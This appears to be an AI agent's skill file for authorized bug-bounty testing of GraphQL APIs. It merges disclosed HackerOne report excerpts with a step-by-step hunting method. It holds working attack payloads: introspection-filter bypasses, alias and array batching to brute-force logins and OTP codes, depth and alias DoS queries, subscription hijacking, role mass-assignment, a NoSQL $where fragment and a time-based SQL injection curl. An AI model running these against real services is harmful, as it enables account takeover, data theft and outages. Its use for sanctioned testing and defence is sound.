---
name: bbhunt-graphql
description: "Use for GraphQL endpoints: introspection, field-level authorization, batching/aliasing abuse, IDOR in queries/mutations, and injection in resolvers. Unified from 3 upstream skills (cbh, h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# GraphQL Authorization and Injection Flaws — unified skill

> **Complete merged skill.** Everything from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus is contained in this file. Unmodified originals remain in `references/` for provenance only.

## Corpus evidence — 13 valid HackerOne reports (2 paid / 15%)

Every disclosed report is valid; payment is an impact signal, not a validity test.

### Techniques ranked across ALL valid reports

| Technique | Reports |
|---|---:|
| API docs / Swagger / introspection | 4 |
| public source-code / repo review | 3 |
| admin / privileged-role context | 3 |
| race / concurrency / timing | 3 |
| unauthenticated / removed-cookie test | 2 |
| HTTP method / verb tampering | 2 |
| mass assignment / extra request fields | 1 |
| internal service / port / container | 1 |
| third-party data / paste / breach reuse | 1 |
| employee / developer public info | 1 |
| intercept & replay request in Burp | 1 |
| Content-Type / body-format switch | 1 |
| header injection (Host / X-Forwarded / etc.) | 1 |
| encoding / double-encode / null byte | 1 |
| cache / CDN / unkeyed header | 1 |

### Parameters observed in writeups

`z2lkoi8vagfja2vyb25ll1rlyw0vmtm` (1)

### Bypass primitives observed

`race condition` (2), `bypass` (1), `bypassing` (1), `content-type` (1), `time based` (1)

### Impact language observed

`password` (19), `token` (9), `admin` (6), `sensitive data` (3), `unauthorised` (3), `unauthorized` (2), `sensitive information` (2), `localhost` (1)

### Case studies — full excerpts (paid and unpaid)

#### [1618347](https://hackerone.com/reports/1618347) — Disclosing  PolicyPageAssetGroup in Private Programs via /graphql `gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/{id}`

HackerOne · $25000 · critical

**Summary:** Hi team, I understand what's going on **Description:** Just a recent update gives the results of private programs ### Steps To Reproduce Without authorization GraphQL: `{"query":"{node(id:\"gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287\"){... on PolicyPageAssetGroupDocument{id,name}}}"}` Answer: `{"data":{"node":{"id":"Z2lkOi8vaGFja2Vyb25lL1BvbGljeVBhZ2VBc3NldEdyb3Vwc0luZGV4OjpQb2xpY3lQYWdlQXNzZXRHcm91cC8zOTgxLTQxMjg3","name":"██████"}}}` This is Asset program - █████████ Thanks! ## Impact Disclosing Sсope(Assets) in Private Programs

#### [707406](https://hackerone.com/reports/707406) — Team object in GraphQL disclosed of private programs via the industry

HackerOne · $500 · low

**Summary:** Disclosure of private programs across the industry If the program is private, it will show industriy ### Steps To Reproduce {"query": "query {team(handle:\\"█████████\\"){_id,industry}}"} `{"data":{"team":{"_id":"█████████","industry":"Computer Hardware \u0026 Peripherals"}}}` {"query": "query {team(handle:\\"█████████\\"){_id,industry}}"} `{"data":{"team":{"_id":"████████","industry":"Computer Software"}}}` {"query": "query {team(handle:\\"███\\"){_id,industry}}"} `{"data":{"team":{"_id":"████","industry":null}}}` ## Impact Disclosure of private programs

#### [3287208](https://hackerone.com/reports/3287208) — DOS via Mutation Aliasing in GraphQL Account Recovery Phone Number Verification API

HackerOne · no bounty — still valid · severity n/a

**Summary:** The GraphQL API’s `verifyAccountRecoveryPhoneNumber` mutation can be aliased multiple times in a single request, causing the server to process each mutation sequentially. Each additional alias adds approximately 8 seconds to the server’s response time, enabling (DoS) attack by exhausting server resources and increasing latency. **Description:** The `verifyAccountRecoveryPhoneNumber` mutation is designed to verify user phone numbers during account recovery phone change. However, the API does not limit the number of mutation aliases in a single GraphQL request. When the same mutation is repeated with different aliases, the server executes each one separately, performing expensive backend operations multiple times. This leads to a linear increase in response time based on the number of aliases included. The result is a resource exhaustion vulnerability that can degrade or deny service availability to legitimate users. ### Steps To Reproduce 1. Prepare a GraphQL mutation request with multiple aliases for `verifyAccountRecoveryPhoneNumber`, In this case, the response time will exceed 20 seconds because each alias (verify1, verify2, verify3) adds approximately 8 seconds of processing time. 2. Send the request to the GraphQL endpoint with valid or dummy `verification_code` and `otp_code` variables. 3. Observe the response time increases by 8 seconds for each additional mu

#### [898528](https://hackerone.com/reports/898528) — GraphQL AdminGenerateSessionPayload is leaked to staff with no permission

Shopify · no bounty — still valid · medium

@hiffley reported the ability to generate app tokens via the adminGenerateSession mutation in Shopify Admin, as a staff member with no permissions. This allowed for accessing a small subset of installed apps that are using this new flow (including Shopify Email). Access was limited to the current shop. We fixed this by adding a check for Apps permission to this mutation. This is a limited disclosure at the request of @hiffley. POC request:

#### [2357012](https://hackerone.com/reports/2357012) — Inadequate redaction exposes sensitive information via the “ShareReportViaEmail" GraphQL endpoint

HackerOne · no bounty — still valid · medium

## Summary The vulnerability involves the insufficient redaction of sensitive information within the HackerOne platform. Specifically, the redaction feature, designed to conceal certain data such as JIRA references, fails to completely obscure this information from being accessed through GraphQL requests. ## Steps to Reproduce 1. Execute the following GraphQL request: 2. Observe the response, which includes the redacted `impact` field. ## Impact The impact of this vulnerability is significant as it undermines the confidentiality measures put in place by the redaction feature. An attacker or unauthorized user could potentially exploit this vulnerability to gain access to sensitive information which might include critical data. ███████

#### [3287208](https://hackerone.com/reports/3287208) — DOS via Mutation Aliasing in GraphQL Account Recovery Phone Number Verification API

HackerOne · no bounty — still valid · severity n/a

**Summary:** The GraphQL API’s `verifyAccountRecoveryPhoneNumber` mutation can be aliased multiple times in a single request, causing the server to process each mutation sequentially. Each additional alias adds approximately 8 seconds to the server’s response time, enabling (DoS) attack by exhausting server resources and increasing latency. **Description:** The `verifyAccountRecoveryPhoneNumber` mutation is designed to verify user phone numbers during account recovery phone change. However, the API does not limit the number of mutation aliases in a single GraphQL request. When the same mutation is repeated with different aliases, the server executes each one separately, performing expensive backend operations multiple times. This leads to a linear increase in response time based on the number of aliases included. The result is a resource exhaustion vulnerability that can degrade or deny service availability to legitimate users. ### Steps To Reproduce 1. Prepare a GraphQL mutation request with multiple aliases for `verifyAccountRecoveryPhoneNumber`, In this case, the response time will exceed 20 seconds because each alias (verify1, verify2, verify3) adds approximately 8 seconds of processing time. 2. Send the request to the GraphQL endpoint with valid or dummy `verification_code` and `otp_code` variables. 3. Observe the response time increases by 8 seconds for each additional mu

#### [898528](https://hackerone.com/reports/898528) — GraphQL AdminGenerateSessionPayload is leaked to staff with no permission

Shopify · no bounty — still valid · medium

@hiffley reported the ability to generate app tokens via the adminGenerateSession mutation in Shopify Admin, as a staff member with no permissions. This allowed for accessing a small subset of installed apps that are using this new flow (including Shopify Email). Access was limited to the current shop. We fixed this by adding a check for Apps permission to this mutation. This is a limited disclosure at the request of @hiffley. POC request:

### Recurring approach patterns from real reports

- 1× when clicking on change password after supplying values for current password password and confirm password user is directed to sign in page to log in again with changed password
- 1× i ve found a misconfiguration in your graphql api on the endpoint in which an attacker is able to run a graphql interospection query to fetch schemas types fields available query operations after running interospection query on the graphql api endpoint an attacker is able to list all type of available api calls so he ll be able to perform unauthorised api calls due to this misconfiguration
- 1× impact an attacker can exploit this vulnerability to cause a denial of service dos by sending a single graphql request with multiple aliases of the expensive mutation

## Corpus-backed method (this class)

1. Enumerate the schema (introspection, persisted queries, error-based reconstruction) and record queries, mutations and input types.
2. Map which inputs take caller-supplied IDs/roles and which fields are sensitive.
3. Test field-level authorization with two accounts and different roles — a protected root field often has unprotected nested fields.
4. Test batching and aliasing to bypass rate limits and to amplify repeated resolver calls.
5. Probe fragment/alias/directive tricks that change resolver arguments after validation.
6. Test injection inside resolver-built SQL/templates and file paths; use the corresponding class skill for the sink.
7. Prove unauthorized data or state change with exact operation documents in evidence.

### Signals

- /graphql or Apollo/GraphiQL markers
- Introspection enabled or reconstructable via validation errors
- Mutations that change money, roles, or objects

### Kill criteria

- Introspection disabled *and* schema not reconstructable — still test known operations from JS bundles.
- All field-level checks enforced against the authenticated identity.
- No sensitive field or state-changing mutation reachable.

### Escalation chains

- Introspection -> hidden mutation -> authz bypass -> PII.
- Batching -> rate-limit bypass -> OTP brute force.

### Probes

- __schema query, __typename error reconstruction, aliased repeated fields, nested ID arguments, batch arrays.

### Veteran tip

The operator's thredup notes show schema reconstruction via validation errors even with introspection disabled.

## Unified upstream methodology (complete, deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Run introspection; if disabled, use field suggestions and error messages.
- Test object-level authz on every query and mutation.
- Look for nested traversal and alias/batch abuse.
- Test mass assignment on mutations and hidden/admin fields.
- Check injection in arguments passed to resolvers.

### Deeper checklist

- Run introspection; if disabled, use field suggestions and error messages to recover the schema.
- Test object-level authorization on every query and mutation, not just the UI-used ones.
- Look for nested traversal and batch/alias abuse to bypass rate limits.
- Test mass assignment on mutations and hidden/admin fields.
- Check injection in arguments passed to resolvers (SQL/NoSQL, SSRF, template).
- Probe depth/complexity limits and query batching for DoS.
- Verify cross-tenant data access with two accounts.

### Step-by-Step Hunting Methodology

1. **Discover the endpoint** — spider JS bundles, check `/graphql`, `/api/graphql`, review Burp passive scan hits for `application/json` POST with query fields

2. **Test introspection** — send the full introspection query. Even if blocked, try field-level enumeration:
   ```graphql
   { __typename }
   ```
   If that returns, introspection may be partially blocked but the schema is discoverable

3. **Map the full schema** — use `InQL` (Burp extension) or `graphql-voyager` to visualize relationships. Specifically look for:
   - Mutations that modify ownership, permissions, or membership
   - Mutations that mirror REST API functionality

4. **Identify REST/GraphQL overlap** — document every resource that can be modified via BOTH REST and GraphQL. These dual-write surfaces are your RC targets.

5. **Test authorization boundaries per mutation** — replay mutations as lower-privilege users. Does the server enforce the same authz as the equivalent REST call?

6. **Hunt cross-API state desync** — find sequences where:
   - REST action should revoke access
   - GraphQL mutation re-grants or preserves it
   - Test the ordering: REST first → GraphQL → check state; then GraphQL first → REST → check state

7. **Test for persistent privilege after role/membership changes** — remove a user via REST, then call the corresponding GraphQL mutation for that resource. Query current state via both APIs and compare.

8. **Probe for IDOR in node IDs** — GraphQL global IDs often encode object type + ID. Swap IDs across object boundaries and across account contexts.

9. **Check batch query abuse** — send arrays of operations to bypass rate limiting or amplify enumeration.

10. **Document the exact reproduction chain** — for RC bugs, time-based steps must be reproducible deterministically.

---

### A. Discovery checklist — concrete places, params, headers, flows to look

- **Endpoint discovery by universal query**: `{query:{__typename}}` (or `{"query":"{__typename}"}`) returns `{"data":{"__typename":"query"}}` on any GraphQL service. Probe `/graphql`, `/api`, `/api/graphql`, `/graphql/api`, `/graphql/graphql`, `/v1/graphql`, plus `/graphiql`, `/playground`, `/altair`. A non-GraphQL endpoint typically replies "query not present" — still a useful discriminator.
- **HTTP-method differential**: production best practice is JSON POST only. Test GET with `?query=...`, POST `application/x-www-form-urlencoded`, and POST `multipart/form-data`. These alternate shapes enable CSRF (below) and often bypass introspection filters that only inspect POST JSON bodies.
- **Introspection probe**: `{"query":"{__schema{queryType{name}}}"}`. Then full introspection (`query IntrospectionQuery { __schema { queryType{name} mutationType{name} subscriptionType{name} types{...FullType} directives{...} } } ...`). If the canonical query fails, delete `onOperation`/`onFragment`/`onField` from the `directives` block — many servers reject those.
- **Schema leakage without introspection**: Apollo/graphql-js "Did you mean ...?" suggestions. Run Clairvoyance to reconstruct the schema from suggestions, and look for hidden `__typename`-bearing fields. Disable is not sufficient — WSTG explicitly says disable *both* introspection and suggestions.
- **Introspection-defense bypass**: insert characters GraphQL ignores but regex filters don't — newline, space, comma, tab after `__schema`: `{"query":"query{__schema\n{queryType{name}}}"}`. Also retry over GET, form-POST, and with literal `\u005f\u005f schema` encodings.
- Map every **argument that is an object ID / email / username / tenant**: `id`, `userId`, `internalId`, `node(id:)`, `nodes(ids:)`, `email`, `slug`, `orgId`. OWASP notes that `node`/`nodes` root fields frequently allow direct object access even when not used by the UI (`cat schema.json | jq '.data.__schema.types[] | select(.name=="Query") | .fields[].name' | grep node`).
- Enumerate **mutations** separately from queries: `createUser`, `updateProfile`, `changeRole`, `setEmail`, `resetPassword`, `approveBooking`, `issueCoupon`, `deleteAccount`. Authorization often exists on queries but not mutations (or vice versa).
- Check **edges AND nodes** for authorization. OWASP cites a real report where edge fields were protected but node fields were not — request both the connection wrapper and each returned object's scalar fields.
- Look for **aliases and arrays** in existing client traffic: `aliasedName:field(...)`, or a top-level JSON array of queries. Both are batching primitives and rate-limit bypass candidates.
- Look for **GET-based GraphQL** query params on any endpoint — the CSRF surface PortSwigger calls out. If the app forces `application/json` POST, CSRF is largely blocked by preflight; GET/form-POST reopens it.
- Enumerate **subscriptions** as a separate authz surface (WSS endpoint, `subscription { ... }`). Resolver authorization on queries/mutations is often not applied to subscription setup, yielding a live stream of another tenant's events.
- Check **multipart file-upload GraphQL** endpoints (`operations`, `map`, file parts). The `map` object controls which variable receives the file — a classic place for cross-field injection and IDOR on attachment IDs.
- Note whether **persisted queries / trusted documents** are used (a hash or ID instead of a query string). These block arbitrary introspection but can be abused if hashes are guessable or if one trusted document contains an IDOR-shaped query with attacker-controlled variables.
- Track the **operation-limit** features the deployment should have (max aliases, max root fields, max bytes, max depth, max batch size). Testing each one individually tells you which DoS/brute-force primitive remains available — and gives concrete remediation language for the report.

### Signals and surfaces

### Signal

- Reports: **79** · paid: **28**
- Median bounty **$2,250** · p90 **$7,000** · max **$25,000** · total **$89,172**
- Median upvotes **54**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| HackerOne | 32 | $48,000 | 4532 |
| Shopify | 14 | $13,802 | 845 |
| Mozilla | 1 | $12,000 | 361 |
| GitLab | 7 | $7,370 | 275 |
| EXNESS | 1 | $3,000 | 261 |
| Mail.ru | 1 | $2,500 | 42 |
| New Relic | 4 | $750 | 16 |
| Tools for Humanity | 1 | $500 | 91 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`/graphql` `/api/graphql` `/v1/graphql` `node` `edges` `mutation`

### Crown Jewel Targets

GraphQL vulnerabilities are high-value because the attack surface is both broad and deep — a single endpoint can expose entire data models, privilege escalation paths, and cross-API state confusion. Highest payouts occur in:

- **Platform APIs** (GitHub, Shopify, Stripe-tier targets) where GraphQL mutations interact with REST APIs managing the same resources
- **Race conditions between GraphQL mutations and REST endpoints** where state synchronization is non-atomic — these hit medium-to-high severity reliably
- **Authorization persistence bugs** where team/org/repo membership state is controlled by one API but readable/writable by another
- **B2B SaaS platforms** where one tenant affecting another via schema traversal = critical
- **Internal admin GraphQL endpoints** accidentally exposed to lower-privilege users

The GitHub reports demonstrate the crown jewel pattern: **privilege that should be revoked persists because two APIs disagree on ground truth**.

---

### Attack Surface Signals

**URL Patterns:**
```
/graphql
/api/graphql
/v1/graphql
/query
/gql
/graph
/api/v2/graphql
/internal/graphql
```

**Response Headers:**
```
Content-Type: application/json  (with query body)
X-Request-Id + no REST-style path params = likely GraphQL
```

**JavaScript Source Patterns:**
```js
// grep for these in JS bundles
"query {"
"mutation {"
"__typename"
"apollo"
"ApolloClient"
"graphql-tag"
"gql`"
"operationName"
"GRAPHQL_URI"
```

**Tech Stack Signals:**
- Apollo Server/Client in JS bundles
- Relay in React apps
- `graphene` or `strawberry` (Python), `graphql-ruby`, `gqlgen` (Go), `Lighthouse` (Laravel)
- POST requests with `{"query": "..."}` body shape in Burp history
- `__schema` or `__type` in any response = confirmed GraphQL

**Recon Sources:**
- `github.com` search: `"graphql" site:target.com`
- Wayback Machine for `/graphql` paths
- JS bundle scanning with `LinkFinder` or `getallurls`

---

### Techniques, payloads and bypasses

### Payloads & probes

- Introspection -> `{__schema{types{name fields{name}}}}`
- Alias abuse -> `{a:login(u:"a") b:login(u:"b")}`
- Mass assignment -> `mutation{updateUser(role:"admin"){id}}`
- Injection -> `filter: "{\"$where\":\"...\"}"`

### Bypass tricks

- Bypass depth/complexity limits with aliases or fragments.
- Use GET/query params when POST is blocked.
- Bypass authz with nested connections and node(id:) lookups.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Confidential data of users and limited metadata of programs and reports accessible via GraphQL** — `#489146` · HackerOne · $0 · ▲1033
  > The GraphQL endpoint doesn't have access controls implemented properly.
- **Email address of any user can be queried on Report Invitation GraphQL type when username is known** — `#792927` · HackerOne · $0 · ▲671
  > gid://hackerone/Report/626371 (here 626371 my test program's report id) convert it into base 64, replace that id with the "report id" in the above graphql query
- **Unauthenticated RCE in Taskcluster web-server via GraphQL filter argument (sift $where)** — `#3782701` · Mozilla · $12,000 · ▲361
  > The anonymous role has the required scopes. On `firefox-ci-tc` the `anonymous` role grants `auth:expand-scopes`, `auth:list-roles`, `auth:current-scopes`, and `hooks:list-hooks: `.
- **Private list members disclosure via GraphQL** — `#885539` · X / xAI · $0 · ▲346
  > Send requests to `https://api.█████████.com/graphql/iUmNRKLdkKVH4WyBNw9x2A/ListMembers?variables=%7B%22listId%22%3A%22[Valid Snowflake…
- **Disclosing  PolicyPageAssetGroup in Private Programs via /graphql `gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/{id}`** — `#1618347` · HackerOne · $25,000 · ▲295
  > `{"query":"{node(id:\"gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287\"){...
- **SSRF in graphQL query (pwapi.ex2b.com)** — `#1864188` · EXNESS · $3,000 · ▲261
  > The query for `allTicks` allows setting the parameter `source` that is used to do `GET` requests, this can be set arbitrarily .
- **Github Apps can use Scoped-User-To-Server Tokens to Obtain Full Access to User's Projects in Project V2 GraphQL api** — `#1711938` · GitHub · $0 · ▲198
  > An incorrect authorization vulnerability was identified in GitHub Enterprise Server, allowing for escalation of privileges in GraphQL API requests from GitHub Apps.
- **IDOR on GraphQL queries BillingDocumentDownload and BillDetails** — `#2207248` · Shopify · $5,000 · ▲187
  > An IDOR on the `BillingInvoice` id on both `BillingDocumentDownload` and `BillDetails` graphql operations are leaking other merchants' ██████:
- **DOS via Mutation Aliasing in GraphQL Account Recovery Phone Number Verification API** — `#3287208` · HackerOne · $0 · ▲185
  > Send the request to the GraphQL endpoint with valid or dummy `verification code` and `otp code` variables.
- **Disclosure of `payment_transactions` for programs via GraphQL query** — `#707433` · HackerOne · $0 · ▲178
  > {"query":"query Team mini profile($handle 0:String!,$size 1:ProfilePictureSizes!) {team(handle:$handle 0) {id,...F0}} fragment F0 on Team {id,name,about, profile picturePkPpF:profile picture(size:$size 1),offers swag,offers bounties,base bounty,payment…
- **Authenticated Elasticsearch Painless script execution via Query.search.sort_query on hackerone.com/graphql** — `#3694007` · HackerOne · $7,000 · ▲174
  > Decoded internal ` id` values: `404547633`, `408446504`, `416737094`, `417300042`, `417467303` — monotonically ascending, confirming JSON sort directives are parsed and applied by Elasticsearch.
- **SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter** — `#435066` · HackerOne · $0 · ▲174
  > The `embedded submission form uuid` parameter in the `/graphql` endpoint is vulnerable to a SQL injection.
- **GraphQL AdminGenerateSessionPayload is leaked to staff with no permission** — `#898528` · Shopify · $0 · ▲173
  > This is a limited disclosure at the request of @hiffley.
- **Undocumented `fileCopy` GraphQL API** — `#981472` · Shopify · $2,000 · ▲157
  > the variables `absoluteKey` `key` and `path`values are the values of the file he uploaded in his store `storeB`
- **Team object in GraphQL disclosed private_comment** — `#978143` · HackerOne · $2,500 · ▲146
  > `{"data":{"node":{" id":"████████","pentester":null,"team":null,"key":"scope","private comment":"████","public comment":null,"rating":1,"recipient":null,"subject":null,"survey rating":{" id":"█████","team":null,"state":"completed","respondent":{"…
- **Bug in GraphQL and API integration leads to limited user address disclosure** — `#473742` · Starbucks · $0 · ▲144
  > The modified query resulted in a backend API request with undefined as a parameter.
- **Unauthorized user can obtain `report_sources` attribute through Team GraphQL object** — `#770209` · HackerOne · $2,500 · ▲142
  > `{"data":{"team":{" id":"█████████","report sources":["HackerOne Platform"]}}}` - `["HackerOne Platform"]` - private program
- **Private program disclosure via `vpn_suspended` GraphQL query** — `#715192` · HackerOne · $2,500 · ▲138
  > If an external program (which also has private program) has enabled VPN , then value of vpn suspended become false, so with this information, an attacker can find external programs which have private program, because there is no VPN feature in sandbox mode…
- **GraphQL field on Team node can be used to determine if External Program runs invite-only program** — `#877642` · HackerOne · $2,500 · ▲107
  > + Condition 1 - When an external program doesn't have any policy defined, `policy markdown html` will be `null`.
- **Team object in GraphQL disclosed total number of whitelisted hackers** — `#342978` · HackerOne · $2,500 · ▲93
  > `{"data":{"team":{"id":"Z2lkOi8vaGFja2Vyb25lL1RlYW0vMTM=","name":"HackerOne","handle":"security",
- **IDOR - Leaking of team data (name, email, ID, member ID) via POST /api/v1/graphql  `FetchMemberships` operation** — `#2381816` · Tools for Humanity · $500 · ▲91
  > An authorization bypass issue was identified and subsequently remediated in the `FetchMemberships` GraphQL operation.
- **CSRF on /api/graphql allows executing mutations through GET requests** — `#1122408` · GitLab · $3,370 · ▲88
  > Mutations are `edit` or `create` queries used in Graphql.
- **Cross-Tenant IDOR ( graphql `AddRulesToPixelEvents` query ) allowing to add, update, and delete rules of any Pixel events on the platform** — `#984965` · TikTok · $0 · ▲84
  > Through a single request the advertiser can Add and/or Modify and/or Delete Pixel events.
- **Private information exposed through GraphQL filters** — `#645299` · HackerOne · $0 · ▲81
  > When passing a where clause to a collection in the `graphql` endpoint, like `teams(where:{ state: { eq: soft launched}})` it queries the state through the secure schema - so it will not return any teams where the state does equal soft launched but you're not…
- **Insecure Direct Object Reference (IDOR) in GraphQL deleteProfileImages Mutation** — `#2968039` · Autodesk · $0 · ▲80
  > An IDOR (Insecure Direct Object Reference) vulnerability was found on Autodesk User Profile, through the "id" parameter which could have allowed an attacker to delete another user's photo.
- **Unauthenticated GraphQL access by prepending __schema to private operations** — `#3452015` · Enjin · $500 · ▲76
  > This security researcher went through an then located exactly where the vulnerability was introduced within the [platform-core](https://github.com/enjin/platform-core) repository so that a rapid fix could be introduced.
- **Team object in GraphQL discloses team group names and permissions** — `#343464` · HackerOne · $2,500 · ▲75
  > Because of the communications error, we can disclose the data - `team member groups{id,name,permissions}`
- **Team object in GraphQL disclosed of private programs via the industry** — `#707406` · HackerOne · $500 · ▲72
  > `{"data":{"team":{" id":"█████████","industry":"Computer Hardware \u0026 Peripherals"}}}`
- **Attachment object in GraphQL continues to grant access to files, even if they are removed from rendering** — `#1132606` · HackerOne · $0 · ▲66
  > In any case, we believe that when a client deletes a file from the page rendering(`{F number file}`), it deletes the path (link) to that file, i.e.
- **Image queue default key of 'None' and GraphQL unhandled type exception** — `#996041` · Reddit · $500 · ▲65
  > <a xlink:href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E" test 6</a

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 7× | `$where` |
| 2× | `\\| Decoded` |
| 2× | `{F_number_file}` |
| 2× | `curl 'https://gitlab.com/api/graphql' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Authorization: Bearer <<TOKEN>>` |
| 1× | `sift(filter)` |
| 1× | `In CSP mode, sift does not support strings in "$where" condition` |
| 1× | `new Function("obj", "return " + myString)` |
| 1× | `next()` |
| 1× | `curl -sk 'https://hackerone.com/graphql' -H @/tmp/h1.headers -b "$COOKIE" \ / --data-raw '{"query":"{me{_id username}}"}' \\| jq` |
| 1× | `(empty) \\| HTTP 500 /` |
| 1× | `edges { cursor node { id } }` |
| 1× | `source: "doc[\"_seq_no\"].value` |
| 1× | `sort_query: '[{"id":"asc"}]` |
| 1× | `doc[\"_seq_no\"].value` |
| 1× | `doc['<field>'].value` |
| 1× | `curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27` |
| 1× | `curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27` |
| 1× | `{"data":{"team":{"_id":"██████████","report_sources":[]}}}` |
| 1× | `{"data":{"team":{"_id":"█████","report_sources":["HackerOne Platform"]}}}` |
| 1× | `{"data":{"team":{"_id":"█████████","report_sources":["HackerOne Platform"]}}}` |

### Common Root Causes

1. **Dual-write without atomic locking** — developers implement the same resource modification in both REST and GraphQL independently. Neither system is aware the other exists for that resource. State updates aren't serialized or compared.

2. **Inconsistent authorization middleware** — REST endpoints go through one auth layer (e.g., middleware chain), GraphQL resolvers go through a different resolver-level check. The same action, different enforcement.

3. **GraphQL as "new REST" migration** — teams add GraphQL mutations that mirror REST functionality without auditing the permission model. The GraphQL version is less mature and skips checks the REST version accumulated over time.

4. **Introspection left on in production** — default framework settings (Apollo, Graphene) enable introspection in all environments. Developers forget to disable it, treating it as "just documentation."

5. **Node ID trust without re-authorization** — GraphQL global IDs (`base64("ObjectType:123")`) are decoded and trusted without verifying the requesting user has access to that specific object.

6. **Mutation side effects not mirrored** — when a REST action triggers cascading effects (e.g., team removal cascades to permission revocation), the GraphQL equivalent mutation doesn't trigger the same cascades.

---

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **IDOR via unsanitized argument** (PortSwigger product-shop example): list only shows `listed:true` products with IDs 1,2,4 → query the gap: `query { product(id: 3) { id name listed } }`; a returned row with `listed: false` proves unlisted-object access. Chain to other users' records by changing `internalId`.
- **Alias-rate-limit bypass** (PortSwigger lab): a single mutation with 100 uniquely aliased `login` calls —
  ```graphql
  mutation {
    brute0:login(input:{username:"carlos",password:"p0"}){success token}
    brute1:login(input:{username:"carlos",password:"p1"}){success token}
    # ... brute99
  }
  ```
  removes `variables`/`operationName`, then search the response for `"success":true`. Works because the limiter counts HTTP requests, not operations.
- **Array batching** bypasses the same limiter: `[{"query":"{droid(id:\"2000\"){name}}"},{"query":"{droid(id:\"2001\"){name}}"}]` → enumerate objects, brute OTPs, or DoS in one round-trip. WAF/RASP/IDS see one request; Nginx-style per-request limits don't fire. Apollo Server v4 disables array batching by default, but Apollo Gateway and Hasura may still support it — verify, don't assume.
- **2FA/lockout bypass**: aliases re-sending `verifyOtp(code: N)` many times inside one request can process multiple codes before the failure counter is persisted. Report as auth bypass only with a successful verification for a code not legitimately submitted.
- **GraphQL CSRF**: if GET or form-POST is accepted, host an auto-submitting form/`<img>` that sends `?query=mutation{...}`. Defensive bar: require JSON POST, validate content-type, and use CSRF tokens. Cross-reference `csrf` for the exploit scaffold.
- **DoS / depth-bomb**: cyclic nesting `album{ songs{ album{ ... } } }` and breadth bombs with 100 aliases of the same field (`friends1: friends(limit:1)...friends100: friends(limit:100)`) — depth limits alone do not stop alias breadth. CVE-2024-50311 (OpenShift) was an alias-batching DoS; Apollo recommends limits on max aliases/root fields, bytes, query cost analysis, and DataLoader batching.
- **Resource-aware timing**: watch response times and DB load; "shorter than expected" can indicate work handed to a background thread (a race-condition clue). OWASP recommends `graphql-depth-limit`, `graphql-cost-analysis`, `MaxQueryComplexityInstrumentation` as the *defensive* side — their existence tells you what the target probably lacks.
- **Injection through arguments**: string/JSON arguments reach SQL/NoSQL, shells, and template engines like any other input. OWASP lists SQLi, NoSQLi, OS command, SSRF, and CRLF/request smuggling via GraphQL args. Payload shapes are identical to the respective class skills.
- **GraphiQL/GraphQL Playground URL parameter**: older Swagger-style UIs accept `?url=` or `?endpoint=` pointing at an attacker schema — test for SSRF/DOM-XSS style abuse of the explorer itself.

### Payload & Detection Patterns

**Full Introspection Query:**
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
```

**Minimal Introspection Probe (bypass attempt):**
```graphql
{ __typename }
```

**curl introspection test:**
```bash
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query":"{ __schema { queryType { name } } }"}' | jq .
```

**Field suggestion probe (bypass blind introspection blocks):**
```graphql
{ unknownField }
```
If response returns `"Did you mean: [realFieldName]?"` — schema is enumerable despite introspection being disabled.

**Batch query amplification:**
```json
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"}
]
```

**Subscription hijacking (cross-user channel access):**
```graphql
subscription { messageAdded(channelId: "OTHER_USERS_CHANNEL") { content sender { email } } }
```
If subscriptions lack per-user scoping, an attacker can receive real-time events from another user's channel or conversation.

**Multi-code OTP/2FA brute-force via alias batching:**
```graphql
mutation { 
  v1: verifyOtp(code:"000001"){token} 
  v2: verifyOtp(code:"000002"){token}
  v3: verifyOtp(code:"000003"){token}
}
```
A single GraphQL request aliases the same mutation with different OTP codes. Combined with parallel HTTP, this defeats per-request rate limiting and compresses brute-force attempts into fewer network round-trips.

**RC desync test pattern (pseudo-sequence):**
```bash
# Step 1: Grant access via REST
curl -X PUT https://api.target.com/repos/ORG/REPO/teams/TEAM \
  -H "Authorization: token ADMIN_TOKEN" \
  -d '{"permission":"admin"}'

# Step 2: Revoke via REST  
curl -X DELETE https://api.target.com/repos/ORG/REPO/teams/TEAM \
  -H "Authorization: token ADMIN_TOKEN"

# Step 3: Re-assert via GraphQL mutation
curl -X POST https://api.target.com/graphql \
  -H "Authorization: bearer ATTACKER_TOKEN" \
  -d '{"query":"mutation { updateTeamsRepository(input: {repositoryId: \"REPO_ID\", teamId: \"TEAM_ID\", permission: ADMIN}) { clientMutationId } }"}'

# Step 4: Verify persistent access
curl https://api.target.com/repos/ORG/REPO/teams \
  -H "Authorization: token ADMIN_TOKEN"
```

**Grep for GraphQL in JS bundles:**
```bash
grep -Eo '(query|mutation|subscription)\s+\w+\s*[\({]' bundle.js
grep -Eo '"(/[a-z0-9/_-]*graphql[a-z0-9/_-]*)"' bundle.js
```

**GraphQL introspection & audit tooling:**
```bash
# InQL (Burp extension) — visualize GraphQL schema and relationships
